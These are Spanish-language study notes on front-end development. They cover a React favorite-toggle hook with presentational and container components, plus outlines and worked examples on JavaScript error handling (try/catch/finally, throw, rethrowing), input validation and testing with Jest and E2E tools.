import { useState, useCallback } from 'react';

// Define la firma de lo que devuelve el hook
interface UseFavoriteToggleResult {
  isFavorite: boolean;
  handleToggle: () => void;
}

/**
 * Gestión la lógica de alternar el estado de favorito (true/false).
 *
 * @param initialStatus Estado inicial del favorito.
 * @returns El estado actual y una función para alternarlo.
 */
export const useFavoriteToggle = (initialStatus: boolean): UseFavoriteToggleResult => {
  const [isFavorite, setIsFavorite] = useState<boolean>(initialStatus);

  // Usa useCallback para garantizar que la función es estable.
  const handleToggle = useCallback(() => {
    setIsFavorite(prev => !prev);
    // Aquí podrías añadir lógica de API para persistencia, si fuera parte del hook.
    console.log(`Estado de favorito cambiado a: ${!isFavorite}`);
  }, [isFavorite]);

  return { isFavorite, handleToggle };
};
```


2. Componente Dumb / Presentacional (Responsabilidad: Renderizado)

Solo se encarga de cómo se ve.

Recibe sus datos y funciones solo a través de props y no tiene conocimiento del estado global, APIs o de dónde provienen sus datos.

Archivo: FavoriteButton.tsx

```
import React from 'react';

// 1. Tipado explícito de Props
interface FavoriteButtonProps {
  isFavorite: boolean;
  onToggle: () => void; // Recibe la función de lógica por prop
}

/**
 * Componente Presentacional (Dumb): Renderiza el botón basado en props.
 */
const FavoriteButton: React.FC<FavoriteButtonProps> = ({ isFavorite, onToggle }) => {
  // El icono depende del estado que recibe
  const icon = isFavorite ? '❤️' : '🤍';
  const label = isFavorite ? 'Remover de Favoritos' : 'Añadir a Favoritos';

  return (
    <button
      onClick={onToggle} // Llama a la función recibida por prop
      aria-label={label}
      style={{
        background: 'none',
        border: 'none',
        cursor: 'pointer',
        fontSize: '24px'
      }}
    >
      {icon} {label}
    </button>
  );
};

export default FavoriteButton;
```


3. Componente Smart / Contenedor (Responsabilidad: Lógica de la Aplicación)

Responsable de unir la lógica con la UI

Llama al Custom Hook y le pasa la lógica y el estado resultante al componente presentacional.

Archivo: ProductContainer.tsx

```
import React from 'react';
import FavoriteButton from './FavoriteButton';
import { useFavoriteToggle } from '../hooks/useFavoriteToggle';

interface ProductContainerProps {
  productId: string;
  initialFavoriteStatus: boolean;
}

/**
 * Componente Contenedor (Smart): Encargado de la lógica de la aplicación.
 *
 * NOTA: Aquí se añadiría lógica como hacer un POST a la API para persistir el cambio
 * o conectarse al store global (Redux/Zustand).
 */
const ProductContainer: React.FC<ProductContainerProps> = ({ productId, initialFavoriteStatus }) => {
  
  // 1. Llama al Custom Hook y obtiene la lógica y el estado.
  const { isFavorite, handleToggle } = useFavoriteToggle(initialFavoriteStatus);

  // 2. Opcional: Lógica adicional de negocio o persistencia
  const handlePersistToggle = () => {
    handleToggle(); // Actualiza el estado local
    console.log(`Producto ${productId}: Iniciando llamada a API para actualizar...`);
    // Lógica para enviar el cambio al servidor aquí
  };

  return (
    <div style={{ padding: '20px', border: '1px solid #ccc' }}>
      <h3>Producto ID: {productId}</h3>
      
      {/* 3. Renderiza el componente Dumb y le pasa la lógica y el estado. */}
      <FavoriteButton
        isFavorite={isFavorite}
        onToggle={handlePersistToggle} // Le pasa la función manejadora del contenedor
      />
    </div>
  );
};

export default ProductContainer;
```




# Manejo de Errores

Fundamental para escribir código robusto y confiable.

## 1. Fundamentos

1. try...catch:
Sintaxis y funcionamiento
¿Qué tipo de errores captura? (Errores de tiempo de ejecución).
Accediendo al objeto de error (err o error) dentro del bloque catch.

2. Bloque finally:
Propósito: Ejecutar código siempre, independientemente de si se produjo un error o no.
Casos de uso: Liberar recursos (cerrar archivos, conexiones).

3. Lanzamiento de Errores (throw):
Generar (lanzar) tus propios errores
Lanzar diferentes tipos de valores (cadenas, números, y el objeto Error).


## 3. Tipos de Errores Nativos y el Objeto Error

Jerarquía y las propiedades del objeto Error

1. Objeto Error:
Propiedades clave: message, name, y stack (pila de llamadas).
Creación de instancias: new Error("Mi mensaje de error").

2. Tipos de Errores Nativos Comunes:
SyntaxError (Errores de análisis léxico, no capturables por try...catch en la función donde ocurren).
ReferenceError (Variables no definidas).
TypeError (Uso de un valor donde no se espera, ej. llamar a algo que no es una función).
RangeError (Valores fuera del rango de valores válidos, ej. recursión infinita).
URIError (Errores en funciones encodeURI/decodeURI).

3. Creación de Clases de Errores Personalizados:
Extender la clase base Error usando class MiError extends Error {...}.
Establecer un name personalizado para una fácil identificación.


## 3. Manejo de Errores en Código Asíncrono

Requiere técnicas específicas

1. Errores en Callbacks Tradicionales
El patrón del "Error-Primero" ((err, data) => {}) en Node.js y código antiguo.

2. Errores con Promesas (Promises):
El método .catch(): La forma estándar de manejar rechazos (rejections).
La función de rechazo dentro del constructor de la Promesa (reject(new Error(...))).
Encadenamiento de promesas: Cómo los errores se propagan hasta el siguiente .catch().

3. Manejo de Errores con async/await:
Usar try...catch alrededor de las llamadas await. Este es el método preferido.
Comprender que await lanza una excepción si la Promesa se rechaza.


## 4. Prácticas y Estrategias Avanzadas

Manejo de errores de manera efectiva en aplicaciones grandes.

1. Fallos Silenciosos vs. Fallos Ruidosos:
Cuándo registrar un error y continuar (fallo silencioso controlado).
Cuándo el error debe detener la ejecución o alertar al usuario (fallo ruidoso).

2. Validación de Entrada (Input Validation):
Prevenir errores mediante la verificación temprana de datos (ej. con aserciones o bibliotecas de validación).

3. Estrategias de Registro (Logging):
Uso de console.error() vs. herramientas de registro (ej. Log4js, bibliotecas de terceros, o servicios como Sentry/Bugsnag).
Registrar la pila de llamadas (stack) para facilitar la depuración.

4. Manejo de Errores Globales (Entornos Browser/Node):
En el navegador: Evento window.onerror y window.onunhandledrejection
En Node.js: Eventos uncaughtException y unhandledRejection del objeto process.
La diferencia entre errores capturados y no capturados.


## 5. Depuración y Herramientas

Herramientas para encontrar y resolver la causa raíz de los errores

1. Uso del Depurador (Debugger):
Uso de la declaración debugger en el código.
Puntos de interrupción (Breakpoints) y la interfaz del depurador en el navegador (DevTools) o IDE.
Inspección de variables y seguimiento de la pila de llamadas (Call Stack).
Inspección de variables y seguimiento de la pila de llamadas (Call Stack).

2. Pruebas Unitarias para Errores:
Asegurar que las funciones lanzan los errores esperados bajo ciertas condiciones (ej. usando expect().toThrow() en Jest/Mocha).

##### Practica: intenta refactorizar código sin manejo de errores para incluir try...catch y promesas, enfocándote en lo que se debe hacer cuando un error realmente rompe tu aplicación.





# Validación

Esencial para asegurar la integridad de los datos y la seguridad de tu aplicación.

Desde del lado del cliente hasta las validaciones cruciales del lado del servidor.


## 1. Fundamentos Validación Client-Side

Mejora la experiencia del usuario (UX) al proporcionar feedback instantáneo.

1. Uso de Atributos HTML5:
required: Asegura que un campo no esté vacío.
minlength/maxlength: Controla la longitud del texto.
min/max: Controla el rango de valores numéricos.
type (ej. email, number, url): Utiliza validación de formato incorporada.
pattern: Uso básico de expresiones regulares (RegEx) para formatos específicos (ej. códigos postales, matrículas).

2. La API de Validación de Restricciones (Constraint Validation API):
Métodos clave: checkValidity(), reportValidity().
Propiedades: validity (objeto que contiene flags como valueMissing, typeMismatch, patternMismatch).
Personalización de mensajes de error con setCustomValidity().

3. Validación con JavaScript Puro (Escuchadores de Eventos):
Uso de eventos submit en formularios y input/change/blur en campos individuales para validar dinámicamente.
Mostrar y ocultar mensajes de error de forma manual junto a los campos.


## 2. Expresiones Regulares (RegEx) para Validación

Herramienta fundamental para la validación de formato compleja.

1. Conceptos Fundamentales de RegEx:
Anclas: ^ (inicio) y $ (fin).
Clases de caracteres: \d (dígito), \w (palabra), . (cualquier carácter).
Cuantificadores: + (uno o más), * (cero o más), {n,m} (entre n y m).
Grupos y Alternancia: () y |.

2. Casos de Uso Comunes:
Validación de correos electrónicos.
Validación de contraseñas fuertes (longitud, mayúsculas, números, símbolos).
Validación de números de teléfono y fechas con formato estricto.


## 3. Validación del Lado del Servidor (Server-Side)

Módulo es crítico.

La validación del lado del cliente nunca es suficiente para la seguridad.

1. Principio de Confianza Cero:
Asumir que cualquier dato proveniente del cliente es malicioso o incorrecto.
Siempre replicar las validaciones del cliente en el servidor.

2. Validaciones de Negocio vs. Validaciones de Formato:
Formato: Asegurar que un campo sea una cadena o un número.
Negocio: Verificar reglas específicas (ej. un usuario es mayor de 18 años, un producto está en stock, el nombre de usuario no está tomado).

3. Bibliotecas Populares para el Servidor (Node.js):
Joi/Yup/Zod: Definición de esquemas de datos y validación de objetos JSON (útil para APIs REST).
Uso de middleware (como en Express.js) para detener la solicitud si la validación falla.

4. Manejo de Errores de Validación
Respuesta estándar: Devolver un código de estado 400 Bad Request e incluir un cuerpo de respuesta JSON que detalle los errores específicos por campo.


## 4. Técnicas Avanzadas y Seguridad

Abordar escenarios de validación más complejos y consideraciones de seguridad.

1. Validación Asíncrona:
Casos de uso: Verificar la disponibilidad de un nombre de usuario o correo electrónico en la base de datos antes de enviar el formulario final
Implementación usando Promesas o async/await.

2. Saneamiento (Sanitization) de Datos:
Diferencia clave entre Validación (¿Es válido?) y Saneamiento (¿Es seguro modificarlo?).
Prevención de XSS (Cross-Site Scripting): Eliminación de etiquetas peligrosas (<script>, <iframe>) del input del usuario (ej. usando la biblioteca DOMPurify).
Inyección SQL: Uso de consultas parametrizadas (esto suele manejarse a nivel del controlador de la base de datos/ORM, pero es crucial). 

3. Validación de Archivos (Uploads):
Validación de tipo de archivo (MIME Type).
Validación de tamaño de archivo.
Validación de dimensiones de imagen (si es necesario).


## Recorrido

1. Dominar los atributos HTML5 y la API de Restricciones (Módulo 1).
2. Aprender a construir y leer las Expresiones Regulares para formatos comunes (Módulo 2).
3. Practicar la Validación del Lado del Servidor con una biblioteca de esquemas (Joi/Yup/Zod) en un proyecto Node.js/Express (Módulo 3).
4. Implementar la Validación Asíncrona y el Saneamiento en un formulario de práctica (Módulo 4).





# Testing

Crucial para la calidad del software

Permitirá escribir código con confianza, refactorizar sin miedo y prevenir errores en producción.


## 1. Fundamentos

1. Testear:
Ventajas: Confianza en el código, facilitación de la refactorización, documentación del código (las pruebas muestran cómo se usa la función).

Pirámide de Pruebas: Comprender la jerarquía ideal:
Unitarias (más abajo, más rápidas, más numerosas).
Integración (nivel intermedio).
End-to-End (E2E) o UI (más arriba, más lentas, menos numerosas)

2. Terminología Esencial:
Test Runner: La herramienta que ejecuta las pruebas (ej. Jest, Mocha).
Assertions (Aserciones): Declaraciones que verifican el resultado esperado (ej. expect(a).toBe(b)).
Test Suite y Test Case: Organización de las pruebas (describe y it/test).

3. Framework (ej. jest):
Instalación y configuración
Sintaxis básica: describe, test (o it), expect.


## 2. Pruebas Unitarias (Unit Testing)

1. Alcance de una Unidad:
Probar la lógica de la unidad más pequeña y aislada de código (una función, un método de clase).
Asegurar que la función, dado un input, produce el output correcto o el efecto secundario esperado.

2. Mocks, Spies y Stubs
Mocks: Objetos falsos que reemplazan dependencias externas (ej. llamadas a APIs, acceso a bases de datos) para aislar la unidad bajo prueba.
Spies: Observadores que envuelven una función existente para rastrear si fue llamada, cuántas veces y con qué argumentos.
Uso de jest.fn(), jest.mock(), y jest.spyOn().

3. Setup y Teardown
Uso de funciones de hook (beforeAll, beforeEach, afterEach, afterAll) para inicializar y limpiar el estado antes y después de las pruebas.


## 3. Pruebas de Integración (Integration Testing)

Verificar que diferentes partes de tu sistema funcionan correctamente juntas.

1. Definición y Propósito:
Probar la interacción entre dos o más unidades (ej. un controlador y un servicio, un componente y una tienda de estado).

2. Integración de Servicios (Back-End):
Probar endpoints de API utilizando herramientas como supertest para simular solicitudes HTTP (GET, POST, etc.) y verificar las respuestas.
Trabajar con una base de datos de pruebas separada.

3. Integración de Componentes (Front-End):
Probar cómo interactúan componentes hermanos o padre-hijo (ej. un formulario que pasa datos a un botón).
Simular el rendering y eventos del usuario.


## 4. Pruebas de Interfaz de Usuario y E2E (Front-End Testing)

Simular el comportamiento del usuario final y validar la experiencia completa de la aplicación.

1. Pruebas de Componentes (ej. con React Testing Library o Vue Test Utils):
Enfoque en las pruebas de comportamiento del usuario en lugar de los detalles internos del componente.
Uso de selectores accesibles (getByRole, getByText).
Disparo de eventos del usuario (fireEvent o userEvent).

2. Pruebas End-to-End (E2E):
Herramientas: Cypress o Playwright.
Simular un flujo completo del usuario en un navegador real o headless (ej. "Navegar a la página de inicio, iniciar sesión, agregar un artículo al carrito y finalizar la compra").
Configuración y fixtures (datos de prueba).


## 5. Técnicas Avanzadas y Métricas

Llevan tus prácticas de testing al siguiente nivel.

1. Cobertura de Código (Code Coverage):
Métricas: Cobertura de líneas, funciones y ramas.
Cómo generar informes de cobertura (Jest lo hace de forma nativa).
Establecer umbrales de cobertura obligatorios.

2. Test Driven Development (TDD):
El ciclo Rojo-Verde-Refactorizar (Escribir la prueba que falla → Escribir el código mínimo para que pase → Refactorizar).

3. Pruebas de Regresión y Pruebas de Humo:
Regresión: Asegurar que los cambios nuevos no rompieron la funcionalidad existente.
Humo: Un conjunto pequeño de pruebas de alta prioridad para asegurar que la aplicación más básica funciona.


## Recorrido

1. Configura Jest en un proyecto pequeño.
2. Escribe pruebas unitarias para una función pura, usando expect() y toBe().
3. Escribe pruebas unitarias para una función que depende de una API, usando Mocks para simular la respuesta de la API.
4. Añade una prueba de integración simple que verifique la comunicación entre dos módulos de tu código.
5. Si usas un framework de interfaz (React/Vue/Angular), integra RTL/Cypress/Playwright y escribe tu primera prueba E2E.




# Manejos de errores


## 1. try...catch

Permite manejar errores durante la ejecución de tu código sin que toda la aplicación se detenga abruptamente (lo que se conoce como "crashing").

try (Intentar): Contiene el código que sospechas que podría fallar o lanzar una excepción (un error).
Si el código dentro de este bloque se ejecuta sin problemas, el bloque catch se ignora.

catch (Capturar): Si se produce un error en el bloque try, la ejecución se transfiere inmediatamente al bloque catch
Este bloque recibe el objeto de error como argumento, permitiéndote inspeccionarlo, registrarlo o mostrar un mensaje amigable al usuario.

Sintaxis:

```
try {
  // 1. Código que puede lanzar un error (ej. una llamada a una función,
  //    acceder a una propiedad indefinida, etc.)
  let resultado = algunaFuncionPeligrosa();
} catch (error) {
  // 2. Este bloque se ejecuta SOLAMENTE si el bloque 'try' falla.
  //    'error' es el objeto que contiene información sobre el fallo.
  console.error("Se ha producido un error:", error.message);
  // Aquí puedes registrar el error, notificar al usuario, o ejecutar
  // código de recuperación.
}
```


Ej: llamar a una función que no existe


```
try {
  // Esto lanzará un ReferenceError porque la función 'saludar' no está definida.
  saludar("Mundo");
  console.log("Esta línea nunca se ejecutará si hay un error arriba.");
} catch (err) {
  // Captura el ReferenceError
  console.log("¡Algo salió mal!");
  console.error("Tipo de error:", err.name);      // ReferenceError
  console.error("Mensaje de error:", err.message); // saludar is not defined
} finally {
  // El bloque 'finally' se explica a continuación.
}
// El programa continúa ejecutándose aquí, a pesar del error.
console.log("La aplicación sigue funcionando.");
```


finally:
Añadir un tercer bloque opcional, finally, que se ejecuta siempre, independientemente de si hubo o no un error.

Propósito: Se utiliza para realizar operaciones de limpieza o liberar recursos
(ej. cerrar una conexión de base de datos, detener un loader de carga).

```
try {
  // Código...
} catch (err) {
  // Manejo del error...
} finally {
  // ¡Se ejecuta siempre!
  // Aquí puedes poner código de limpieza.
  console.log("Proceso terminado. Recursos liberados.");
}
```


### Limitaciones Clave de try... catch

1. Solo Errores de Tiempo de Ejecución: try...catch solo puede capturar errores que ocurren mientras el código se está ejecutando 
(errores de tiempo de ejecución) como ReferenceError o TypeError.
No puede capturar SyntaxError (errores de sintaxis) porque el motor de JS ni siquiera puede parsear el código correctamente.

2. Captura Errores Asíncronos: El try...catch no funciona directamente con código asíncrono como callbacks o funciones de setTimeout
Si el error ocurre después de que el bloque try haya terminado, no se capturará.

Solución para Asíncrono:
Para Promesas, se usa el método .catch().
Para funciones async/await, puedes usar try...catch alrededor de la llamada await
await transforma el rechazo de la Promesa en una excepción que try...catch puede capturar.

```
// Ejemplo con async/await (DONDE SÍ FUNCIONA)
async function obtenerDatos() {
  try {
    const respuesta = await fetch('url-invalida');
    const datos = await respuesta.json();
  } catch (err) {
    // Esto captura el error de la Promesa rechazada por fetch
    console.error("Error en la petición asíncrona:", err);
  }
}
```


## Finally

Tercera parte opcional de la estructura de manejo de errores try...catch.
Su principal objetivo es asegurar que un código específico siempre se ejecute
Sin importar si el bloque try terminó con éxito o si lanzó y fue capturado por un error.

finally garantiza la ejecución del código que contiene en tres escenarios posibles:

1. Éxito: El código dentro de try se ejecuta completamente sin errores.
2. Fallo Capturado: El código dentro de try lanza un error, y este es capturado por el bloque catch.
3. Fallo No Capturado o Salida Anticipada: El código dentro de try o catch contiene una sentencia de salida como return, break o continue.

El finally está diseñado para realizar tareas de limpieza y liberar recursos.

Uso Comunes:
Liberación de Recursos	Cerrar recursos que deben ser liberados para evitar pérdidas de memoria o conexiones ocupadas
Limpieza de Estado	Ocultar spinners o loaders de carga que se iniciaron en el bloque try, sin importar si la operación asíncrona tuvo éxito o falló.


Sintaxis:

```
try {
  // 1. Intentar hacer algo (ej. abrir un archivo o conexión a la BD).
  // Si tiene éxito, el control pasa a 'finally'.
  conectarBaseDatos();
  // ... hacer operaciones ...
} catch (error) {
  // 2. Si falla, el control pasa a 'catch' y luego a 'finally'.
  console.error("Error al procesar los datos:", error);
} finally {
  // 3. Se ejecuta en todos los casos.
  // Es ideal para la limpieza.
  desconectarBaseDatos();
  console.log("Conexión cerrada, independientemente del resultado.");
}
```


Ej: Salida Anticipada (return)

Demuestra que finally se ejecuta incluso si el bloque try devuelve un valor.

```
function verificarNumero(num) {
  try {
    if (num < 0) {
      throw new Error("Número negativo");
    }
    // El 'return' se procesa, pero 'finally' se ejecuta antes de que
    // el valor sea devuelto a quien llamó a la función.
    return "Número válido"; 
  } catch (err) {
    return "Error: " + err.message;
  } finally {
    console.log("--- FINALIZANDO PROCESO DE VERIFICACIÓN ---");
    // El código aquí se ejecuta antes de que la función retorne
    // el valor "Número válido" o "Error: Número negativo".
  }
}

console.log(verificarNumero(10)); 
// Output:
// --- FINALIZANDO PROCESO DE VERIFICACIÓN ---
// Número válido
```


Prioridad de finally:

##### Si el bloque try o catch intenta devolver un valor, y el bloque finally también tiene una sentencia return
##### El valor de retorno de finally sobrescribe cualquier otro valor de retorno anterior
##### Por esta razón, generalmente no se recomienda incluir sentencias return dentro de finally



## Throw 

Mecanismo para crear y lanzar explícitamente una excepción o un error
##### Permite señalar, desde tu código, que algo inesperado o inválido ha ocurrido. 

##### Su propósito es detener inmediatamente la ejecución del código actual 
##### Y transferir el control a la estructura de manejo de errores más cercana (típicamente un bloque catch).

Flujo de throw:
1. El código llega a la línea throw.
2. La ejecución de la función actual se detiene de golpe.
3. El motor de JavaScript busca el bloque try...catch que pueda "atrapar" ese error.

##### Si no se encuentra un bloque catch que atrape la excepción, el programa terminará y mostrará el error en la consola (Uncaught Error).


Sintaxis y Tipos de Valores:
Puedes lanzar prácticamente cualquier tipo de valor con throw
##### Aunque la mejor práctica es siempre lanzar instancias del objeto Error.


Lanzar el Objeto Error (Mejor Práctica):
##### El objeto Error proporciona información valiosa como la pila de llamadas (stack), el nombre (name) y el mensaje (message).

```
// La mejor manera de lanzar un error
if (cantidad <= 0) {
  throw new Error("La cantidad debe ser un número positivo.");
}
```


Lanzar Errores Nativos Específicos:
Puedes lanzar los tipos de errores incorporados de JavaScript, lo que ayuda a categorizar el problema:

```
// ReferenceError: Si una variable o función no existe.
if (typeof usuario !== 'object') {
  throw new TypeError("El parámetro 'usuario' debe ser un objeto.");
}
```


Lanzar Otros Tipos de Valores (Evitar):
Puedes lanzar cadenas de texto, números o booleanos, pero esto hace que la depuración sea difícil porque carecen de la información de la pila de llamadas.

```
// Aunque es posible, NO es recomendable:
throw "Error: Datos inválidos.";
```


### Integración de Throw con try...catch

throw y catch trabajan juntos para manejar el flujo del programa cuando se detecta un problema.

```
function procesarPedido(items) {
  if (items.length === 0) {
    // 1. Aquí usamos 'throw' para lanzar un error personalizado.
    throw new Error("El carrito de compras no puede estar vacío.");
  }
  // ... lógica de procesamiento ...
  return true;
}

try {
  procesarPedido([]); // 2. La llamada a la función lanza un error
} catch (error) {
  // 3. El bloque 'catch' lo captura.
  console.error("⛔ Error capturado:", error.message);
}
// 4. El programa continúa ejecutándose aquí, sin 'crashear'.
console.log("Fin del programa.");
```


Uso Comunes:

1. Validación de Argumentos: Asegurar que una función reciba los parámetros esperados.
Ejemplo: throw new Error('Parámetro faltante') si un argumento es undefined.

2. Condiciones Ilegales: Indicar que la aplicación ha llegado a un estado que nunca debería ocurrir.
Ejemplo: Cuando una respuesta de API no tiene un código de estado esperado.

3. Errores Personalizados: Utilizar clases para crear tus propios errores con lógica de negocio específica.

```
// Error Personalizado
class CarritoVacioError extends Error {
  constructor(msg) {
    super(msg);
    this.name = "CarritoVacioError";
  }
}

function verificarCarrito() {
  // ...
  throw new CarritoVacioError("No hay productos.");
}
```


##### Usar throw cuando detectas una situación donde no es posible continuar con la lógica de tu función o módulo.

throw se usa para lanzar (crear/generar) una excepción y detener el flujo normal de ejecución de un código.
try...catch se usa para capturar y manejar esa excepción, permitiendo que el programa se recupere y continúe.

1. Validación de Argumentos
Una función requiere un número, pero recibe una cadena (string).
El contrato de la función se rompe. El resultado sería impredecible o incorrecto sin el argumento adecuado.

2. Fallos de Lógica de Negocio
Intentar retirar dinero de una cuenta con saldo insuficiente.
Es un error en el contexto de la aplicación. Detener la transacción previene un estado inválido.

3. Operación Imposible
Intentar acceder a una propiedad de una variable que sabes que debería existir, pero es null o undefined.
Si no lo manejas, resultará en un TypeError no controlado, que es menos informativo que uno lanzado por ti.


throw y	try...catch:

Acción Principal | Flujo de Ejecución | Ubicación Típica | ¿Quién lo usa?

throw:
Lanza o genera una excepción.
Detiene el flujo normal.
Dentro de funciones o validaciones.
El código que detecta el problema.

try...catch:
Captura y maneja una excepción.
Restaura el flujo de ejecución.
Alrededor de llamadas a funciones que pueden fallar.
El código que llama al código problemático.


### Usos de try...catch
Manejar un error que ya fue lanzado
permitiendo que el programa se recupere y continúe su ejecución en lugar de terminar
Lo usas cuando llamas a código que sabes que podría fallar.

1. Prevención de Caídas (Crash):
Es la razón fundamental. 
Envolver código arriesgado asegura que, si falla, tu aplicación no se detenga por completo.

```
try 
{ const data = JSON.parse(userInput); } 
catch (e)
{ // Evita que la app muera si el JSON es inválido. console.error("JSON inválido."); }
```

2. Registro y Depuración
El bloque catch proporciona el objeto de error (error), que contiene la pila de llamadas (stack).
##### Esto es esencial para registrar el error en un sistema de logging
(como Sentry o la consola) para su posterior depuración.

```
} catch (error) 
{ console.error("Ruta de fallo:", error.stack); // ¡Crucial para debug! }
```

3. Manejo de Errores Silencioso
Cuando un fallo es esperado y quieres que la aplicación simplemente ignore el error o lo resuelva de manera alternativa
(ej. si falla la conexión primaria, intentar con una secundaria).

```
try 
{ conectarServidorPrincipal(); } 
catch (e) 
{ conectarServidorSecundario(); // Intentar alternativa }
```

4. Limpieza (con finally)
Aunque técnicamente no es solo del catch, la estructura completa try...catch...finally
es necesaria para garantizar que se ejecuten tareas de limpieza
(como cerrar un archivo o una conexión de red)
sin importar si el código en try tuvo éxito o falló.

```
try { // ... } 
catch (e) { // ... } 
finally { connection.close(); }
```


### try... catch sin throw

##### Esto se hace cuando estás interactuando con código que no controlas
##### O cuando manejas operaciones inherentemente riesgosas

1. Manejar excepciones externas o errores de tiempo de ejecución que no puedes predecir o controlar en tu código, pero que sabes que pueden ocurrir.

Procesar Datos Inseguros o Externos:
caso de uso más común
cuando intentas convertir una cadena de texto a JSON usando el método nativo JSON.parse().
Riesgo: Si la cadena de entrada (input) no tiene el formato JSON correcto (es decir, está malformada)
JSON.parse() lanzará un SyntaxError por sí mismo.

No usas throw, pero envuelves la llamada porque sabes que el motor de JavaScript puede lanzarlo.
El bloque catch te permite manejar la falla de forma elegante.

```
const datosExternos = '{"nombre": "Ana", "edad": 30}'; // JSON Válido
const datosMalos = '{nombre: "Beto", edad: 40}';       // JSON Inválido (sin comillas)

try {
  // Intentamos parsear datos que vienen de fuera (ej. una API o un usuario)
  const objeto = JSON.parse(datosMalos); 
  console.log(objeto.nombre);
} catch (error) {
  // El error es lanzado por JSON.parse(), no por tu código.
  console.error("⛔ Error de parsing:", error.message); 
  // Aquí puedes asignar un valor por defecto o notificar al usuario.
}
// El programa continúa
```


2. Llamadas a Bibliotecas o APIs de Terceros

Si utilizas una biblioteca externa y sabes que una de sus funciones puede fallar debido a una configuración interna o un estado incorrecto
(ej. un fallo de conexión), usas try...catch para aislar ese riesgo.

Riesgo: Una función de una librería puede intentar acceder a una propiedad undefined o lanzar un error de validación interno.

Motivo de Uso: El try...catch actúa como una barrera protectora alrededor de la llamada a código de terceros que no puedes modificar ni garantizar su fiabilidad.


3. Manejar Errores de Referencia o Tipo (Cuando se Esperan)

Aunque generalmente se prefieren las comprobaciones previas, a veces usas try...catch para manejar errores de programación no fatales de forma controlada

Riesgo: Intentar llamar a una función que podría no estar definida en ciertas circunstancias o entornos.

Motivo:

```
try {
  // Si 'posibleFuncion' no existe, JS lanzará un ReferenceError.
  if (typeof posibleFuncion === 'function') {
     posibleFuncion(); 
  }
} catch (e) {
  // Manejar el caso en que la función no está disponible.
}
```


#### Cuando try... catch sin throw es un antipatrón

##### Es una mala práctica usar try...catch para envolver grandes bloques de código

##### o para manejar errores que deberías haber prevenido con una simple comprobación (if).

1. Ocultar Errores de Lógica (try...catch sin re-lanzar)

##### El mayor anti-patrón es usar try...catch para "silenciar" errores que no deberían ocurrir, especialmente si no registras el error (console.error o logging).

```
// MALO: Silencia un error de lógica y no lo registra
try {
  miFuncion(null); // Si miFuncion espera un objeto y falla, nadie lo sabrá.
} catch (e) {
  // Bloque vacío o solo un comentario: ¡NUNCA HAGAS ESTO!
}
```


2. Sustituir Comprobaciones de Propiedades

No uses try...catch para comprobar si una propiedad existe; usa el encadenamiento opcional (?.) o comprobaciones if.

Mal: 

```
try { 
console.log(objeto.propiedad.valor); } 
catch (e) { 
console.log(undefined); }
```

Bien: 

```
console.log(objeto?.propiedad?.valor);
```

##### Usa try...catch sin tu propio throw cuando el riesgo proviene de fuera (datos externos, librerías)

##### o de funciones nativas de JS que lanzan errores estándar (como JSON.parse).

##### Nunca lo uses para tapar tus propios errores de lógica.


### Uso de throw dentro de try... catch


#### 1. throw dentro de catch: re-lanzamiento del error

Error Re-throwing:
##### El objetivo nunca es el mismo que lanzar un error en el bloque try (que es señalar la falla original)
##### en catch: el objetivo es propagarlo después de haber realizado un manejo parcial o una limpieza.

Motivos: 
Permite que tu código haga dos cosas importantes:

1. Registrar y Continuar la Propagación (Logging)
Quieres registrar la información del error (para depuración, alertas, etc.)
##### Pero no quieres que tu función actual lo "resuelva" por completo
porque la función llamadora necesita saber que la operación falló.

Registrar y Propagar:
El bloque catch registra el error a nivel local
(ej. lo envía a un servidor de logging o lo imprime con detalles de depuración)
pero luego lo re-lanza para que el nivel superior de la aplicación lo capture y lo maneje con una lógica de error de más alto nivel
(ej. mostrar un mensaje genérico al usuario o revertir una transacción)

```
function procesarDatos(datos) {
  try {
    // Lógica que puede fallar, ej. acceso a BD
    conexion.guardar(datos); 
  } catch (error) {
    // 1. Manejo local: Registrar el error detalladamente
    console.error("Fallo al guardar en la BD:", error.stack); 
    
    // 2. Re-lanzamiento: Propagar el error
    throw error; // ¡El error original continúa su camino!
  }
}
```


2. Transformar Errores (Error Mapping)
##### A menudo, quieres "envolver" un error de bajo nivel (como un fallo de base de datos o de red) en un error de alto nivel
más significativo para la lógica de tu aplicación.

Mapear Errores:
El bloque catch captura un error técnico (DbConnectionError, NetworkTimeout).
Luego, lanza un nuevo error con un nombre y mensaje más relevantes para el negocio
(ej. NoSePudoCompletarTransaccion)

```
try {
  // Lógica de bajo nivel (ej. librería externa)
  libreriaDePagos.cobrar(monto);
} catch (error) {
  if (error.name === 'TimeoutError') {
    // Lanzamos un error de negocio específico
    throw new Error("El servicio de pagos tardó demasiado en responder."); 
  }
  // Si no es un TimeoutError, re-lanzamos el original
  throw error; 
}
```

##### !!! Nunca debes usar throw dentro de catch si el objetivo principal del bloque catch es resolver el error y permitir que el programa continúe normalmente.
Si el error es manejado y resuelto
(ej. se intenta con un servidor de backup o se devuelve un valor por defecto)
NO se debe re-lanzar el error
Si lo haces, el manejo de la recuperación será inútil, ya que el programa se detendrá de nuevo.


#### 2. throw dentro de try: forma estándar

Método principal para señalar que algo ha fallado y para iniciar el proceso de manejo de errores

try...catch está diseñado para encapsular y monitorear el código donde se espera un fallo potencial
ya sea que lo lance JavaScript (automáticamente) o que lo lances tú (manualmente).

1. Validar Argumentos antes de Ejecutar la Lógica
##### validación temprana: Si una función se da cuenta de que sus argumentos son inválidos o insuficientes, no debe continuar con su lógica.
##### Motivo de Uso: Garantizar que la función solo opere con datos válidos
##### Si los datos no son válidos, lanzas un error antes de que el código llegue a la parte que podría causar problemas internos más graves: un bug de lógica, en lugar de un error de validación claro

```
function calcularImpuesto(monto) {
  // El 'throw' ocurre aquí, dentro de la función, que está envuelta por 'try' externamente.
  if (typeof monto !== 'number' || monto <= 0) {
    // Si la condición es inválida, lanzamos un error inmediatamente.
    throw new TypeError("El monto debe ser un número positivo."); 
  }
  
  // Si la validación pasa, el código continúa
  return monto * 0.15; 
}

// Así es como el código llamador lo usa:
try {
  let impuesto = calcularImpuesto("cien"); // Lanza el TypeError
  console.log(impuesto);
} catch (error) {
  console.error("⛔ Error de cálculo:", error.message);
}
```


2. Señalar Fallos de Lógica de Negocio
Cuando una condición del negocio no se cumple, usas throw para comunicarlo al nivel superior de la aplicación.

Motivo de Uso: Informar que la operación, aunque técnicamente posible, es prohibida por las reglas de la aplicación.
Ejemplo: Un usuario intenta comprar un producto que acaba de agotarse. El código que verifica el stock lanza un error
y el catch externo lo maneja mostrando un mensaje al usuario.


3. Crear Tu Propio Punto de Falla Controlado
##### Cuando llamas a una función que no está garantizada, tú defines el punto de interrupción.
